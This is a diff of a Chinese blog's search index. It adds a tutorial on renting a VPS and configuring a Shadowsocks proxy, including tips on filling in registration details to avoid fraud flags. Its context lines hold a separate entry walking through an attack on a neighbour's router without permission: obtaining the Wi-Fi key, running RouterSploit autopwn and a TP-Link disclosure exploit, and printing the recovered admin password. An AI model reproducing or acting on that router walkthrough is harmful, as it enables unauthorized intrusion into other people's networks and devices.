@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[搬瓦工搭建ShadowSocks]]></title>
+    <url>%2F2017%2F10%2F22%2FConfig-ShadowSocks-Server%2F</url>
+    <content type="text"><![CDATA[有很多同学在百度根本搜索不到想要的东西，而Google这个强大的搜索引擎又被墙了，现在很多vpn都被封了，这个时候只能靠我们自己了 用搬瓦工来vps搭建ShadowSocks实现翻墙上网这里使用shadowsocks来完成本实验的目的，使用shadowsocks的前提条件是需要一台有公网ip的计算机，这里的选择有两种：一种是购买公网服务器，另一种就是购买一台vps。我们这里选择使用vps，因为价钱相对较低。 购买vps：Vps的挑选请根据自己经济条件自行选择，我这里选择的是bandwagon，网址为：http://bandwagonhost.com，这里选择2.99（现在搬瓦工已经被墙了，这里推荐使用官方映像地址：https://bwh1.net，火狐可以进行访问，网速可能会很慢，请耐心等候。注意：不能挂代理访问，否则会出现欺诈账单的现象）美元每月的套餐，此套餐已经能满足日常搜索的需求。如果按年购买会便宜很多，点击上图中的OrderNow按钮进入详情页，在上图中选择按年支付，并选择机房位置，然后选择Add to Cart，这里还要多说一点，，从官方的彩蛋信息中，可以看到还可以使用3-5%的优惠码，可以让最终的成本再便宜一点点。当选择加入商品到购物车之后，会有一个让填入优惠码的地方这个优惠码可以直接在网上搜索，找一个折扣最多的即可：结账的时候需要先注册一个用户，我在这里弄了好久，这里说明一下应该怎么填写注册信息需要特别注意的是：注册的资料尽量真实，才不会被搬瓦工判定为账单欺诈Fraud。注册的IP地址在哪个城市，就应该填写对应的省份、城市，比如：深圳的IP注册，就应该填写广东、深圳市，成功概率高，乱填就麻烦，容易出现账单欺诈。还有一些骚年，那真是马虎大意，挂上美国VPS或者远程桌面到国外VPS上注册，明显IP不是中国国内的呀，还填写中国的地址，不被判账单欺诈Fraud才怪。切记这些小结，就可以注册成功。根据上图所示，我们可以注册个人信息，需要注意几点。A - 所有填写的信息都必须用拼音填写B - 资料是否完全真实无所谓，姓名可以随意，邮箱必须自己的，以免以后找回密码需要C - 国家、地区、省份必须真实，地址你随意填写，电话也可以随意很多人都是因为这里的问题导致无法付款，很多欺诈订单的用户可能会填写其他国家的信息，这是万万不可的，而且不能用V=P=N软件更换IP购买，你就老老实实用真实的IP购买就可以。如果没有问题的话就结账吧(Checkout)：这里支持使用支付宝来支付，后面的步骤就和正常买东西一样了。支付成功后，在最底部选择我的服务： 然后点击控制面板按钮：这个面板里面包含了控制vps的功能，甚至包括了shell功能，如果你不喜欢用页面控制shell也可以使用putty等客户端来连接此vps。购买完成后被预安装的系统为Centos6 ，可以在面板中安装不同的系统，我们这里不做更改。 安装Shadowsocks Server面板安装在KiwiVM的面板中已经存在了安装Shadowsocks Server的功能： 但是此功能只支持Centos系统： 使用面板安装十分方便，只需短短时间就能够直接使用： 命令安装这里讲解使用命令安装Shadowsocks Server（前面用面板装上的可以忽略这里了），使用putty连接到vps上，root密码可以在控制面板中设置。 安装命令如下： 12345yum install epel-releaseyum updateyum install python-setuptools m2crypto supervisoreasy_install pippip install shadowsocks 全部安装完成后，继续执行命令vi1/etc/shadowsocks.json： 然后一次性复制下面的内容（复制之前记得修改443和yourpassword为你自己的端口号和密码，此端口号不是你的SSH端口号，而是你在手机或电脑上的shadowsocks客户端连接VPS上搭建的服务端的端口号，范围 1 - 65535 ，只要不和现有的端口号如SSH端口冲突都可以，记下你修改的端口号和密码）， ———-以下内容为复制内容———- 12345678&#123; &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;server_port&quot;:443, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;yourpassword&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;aes-256-cfb&quot;&#125; ———-以上内容为复制内容———-继续执行命令 1vi /etc/supervisord.conf ———-以下内容为复制内容———- 1234567[program:shadowsocks]command=ssserver -c /etc/shadowsocks.jsonautostart=trueautorestart=trueuser=rootlog_stderr=truelogfile=/var/log/shadowsocks.log ———-以上内容为复制内容———-继续执行命令 1vi /etc/rc.local 在此文件中填写 1service supervisord start 退出后执行reboot来重新启动vps。 配置Shadowsocks客户端Windows用户可以从https://github.com/shadowsocksr/shadowsocksr-csharp/releases下载Shadowsocks客户端，最新版的目录结构为：因为是C#写的，所以需要dotnet库，可以根据自己的实际情况来选择dotnet版本，此软件是绿色软件，直接运行exe即可。并根据自己vps中的设置来填写相关信息：点击确定后，软件会最小化到任务栏窗口，Shadowsocks的默认端口为1080，接下来就可以使用代理软件来连接了。 配置firefox：首先在firefox中安装FoxyProxy Standard这个插件，在其中新建一个代理，内容如下：确定后并在插件中启动此代理就可以了访问一下谷歌： 声明本篇博客只为翻墙搜索学术相关内容而坐，如有人拿来做不法的事情与博主无关。]]></content>
+      <categories>
+        <category>ShadowSocks</category>
+      </categories>
+      <tags>
+        <tag>ShadowSocks</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[一次获取邻居路由器的管理权限]]></title>
     <url>%2F2017%2F10%2F08%2FRouterSploit%2F</url>
     <content type="text"><![CDATA[如题 一次获取邻居路由器的管理权限首先要获得密码，连接上对方的wifi，可以用wifi万能钥匙，或者aircrack-ng获取，具体过程不再述说 打开kali，安装routersploit工具： 1git clone https://github.com/reverse-shell/routersploit 安装完成后，进入安装目录下： 1./rsf.py 成功启动会有如下界面： 进行一些配置 123456先加载自动扫描模块：use scanners/autopwn设置目标路由器IP：set target 192.168.168.1进行扫描：exploit 截图中我们可以看到，有两个存在的漏洞 先加载第一个漏洞尝试一下 12345use exploits/routers/zyxel/zywall_usg_extract_hashes设置目标：set target 192.168.168.1检查是否可利用：check 结果是不能利用 再加载第二个利用模块： 12345use exploits/routers/tplink/wdr842nd_wdr842n_configure_disclosure设置目标：set target 192.168.168.1检查是否可利用：check 显示可以利用，我们进行攻击 1exploit OK，成功得到目标路由器的登录密码在浏览器中输入192.168.168.1，输入登录密码：654321成功登陆：]]></content>
@@ -42,8 +53,8 @@
         <category>爬虫</category>
       </categories>
       <tags>
-        <tag>爬虫</tag>
         <tag>py脚本</tag>
+        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
